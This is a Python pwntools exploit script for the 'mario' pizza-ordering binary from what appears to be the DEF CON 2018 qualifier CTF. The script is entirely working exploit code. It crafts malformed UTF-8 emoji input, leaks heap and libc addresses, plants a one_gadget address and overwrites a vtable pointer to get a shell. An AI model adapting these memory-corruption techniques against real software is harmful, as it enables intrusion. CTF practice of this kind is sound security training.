from pwn import *

def menu(p):
	p.recvuntil(': ')

p = process('./mario')
# p = remote('83b1db91.quals2018.oooverflow.io', 31337)

pineapple = '\xf0\x9f\x8d\x8d'
tomato = '\xf0\x9f\x8d\x85'
chicken = '\xf0\x9f\x90\x94'
banana = '\xf0\x9f\x8d\x8c'
shit = '\xf0\x9f\x92\xa9'

# print p.recvuntil('Solution:')
# sol = raw_input()
# p.sendline(sol)

# register
menu(p)
p.sendline('N')
p.recvuntil('? ')
p.sendline('memeda')

# order
menu(p)
p.sendline('O')
p.recvuntil('? ')

p.sendline(str(33)) # pizza num
for i in xrange(16):
	i1 = tomato + '\xf0\x9f\xf0\x9f'
	i2 = '\x8d\x8d\x8d\x8d' + chicken # fake a pineapple in the middle
	p.recvuntil('? ')
	p.sendline('2')
	p.recvuntil(': ')
	p.sendline(i1)
	p.recvuntil(': ')
	# raw_input('wait')
	p.sendline(i2)

	i1 = tomato
	p.recvuntil('? ')
	p.sendline('1')
	p.recvuntil(': ')
	p.sendline(i1)

i1 = tomato
p.recvuntil('? ')
p.sendline('1')
p.recvuntil(': ')
p.sendline(i1)

menu(p)
p.sendline('C')
p.sendline('A' * 280)

menu(p)
p.sendline('Y')

menu(p)
p.sendline('W')
p.recvuntil('say: ')

leak = p.recvuntil('\n', drop=True)
leak = leak.ljust(8, '\x00')
heap_addr= u64(leak)
print hex(heap_addr)

# register
menu(p)
p.sendline('N')
p.recvuntil('? ')
p.sendline('memeda1')

# order
menu(p)
p.sendline('O')
p.recvuntil('? ')

p.sendline(str(2)) # pizza num
i1 = tomato
p.recvuntil('? ')
p.sendline('2')
p.recvuntil(': ')
p.sendline(i1)
p.recvuntil(': ')
p.sendline(i1)

i1 = tomato
p.recvuntil('? ')
p.sendline('1')
p.recvuntil(': ')
p.sendline(i1)

menu(p)
p.sendline('L')

menu(p)
p.sendline('Y')

menu(p)
p.sendline('W')
p.recvuntil('say: ')

leak = p.recvuntil('\n', drop=True)
leak = leak.ljust(8, '\x00')
leak = u64(leak)
print hex(leak)
libc_base = leak - 0x3c4c98
print 'libc base: %s' % hex(libc_base)

##################### stage2 #######################
# register
one_gadget = p64(libc_base + 0x4526a)
menu(p)
p.sendline('N')
p.recvuntil('? ')
p.sendline(one_gadget)

# order
menu(p)
p.sendline('O')
p.recvuntil('? ')

p.sendline(str(2)) # pizza num
i1 = tomato + '\xf0\x9f\xf0\x9f'
i2 = '\x8d\x8d\x8d\x8d' + chicken # fake a pineapple in the middle
p.recvuntil('? ')
p.sendline('2')
p.recvuntil(': ')
p.sendline(i1)
p.recvuntil(': ')
# raw_input('wait')
p.sendline(i2)

i1 = tomato + '\xf0\x9f\xf0\x9f'
i2 = '\x8d\x8d\x8d\x8d' + chicken # fake a pineapple in the middle
p.recvuntil('? ')
p.sendline('2')
p.recvuntil(': ')
p.sendline(i1)
p.recvuntil(': ')
# raw_input('wait')
p.sendline(i2)

menu(p)
p.sendline('L')

# register
menu(p)
p.sendline('N')
p.recvuntil('? ')
p.sendline('parkpark')

# order
menu(p)
p.sendline('O')
p.recvuntil('? ')

p.sendline(str(1)) # pizza num
i1 = tomato + 'X' * 10
p.recvuntil('? ')
p.sendline('10')
for _ in xrange(10):
	p.recvuntil(': ')
	p.sendline(i1)

menu(p)
p.sendline('C')
p.sendline('A' * 0x80)

menu(p)
p.sendline('L')

# login
menu(p)
p.sendline('L')
p.recvuntil('? ')
p.sendline(one_gadget)

menu(p)
p.sendline('C')
p.sendline('1' * 0x60)

fake_vt = heap_addr - 0x2060
print hex(fake_vt)

menu(p)
p.sendline('P')
p.recvuntil(': ')
p.sendline('A' * 8 * 18 + p64(fake_vt))

menu(p)
p.sendline('L')
p.recvuntil('? ')
p.sendline('parkpark')

menu(p)
p.sendline('A')

p.interactive()

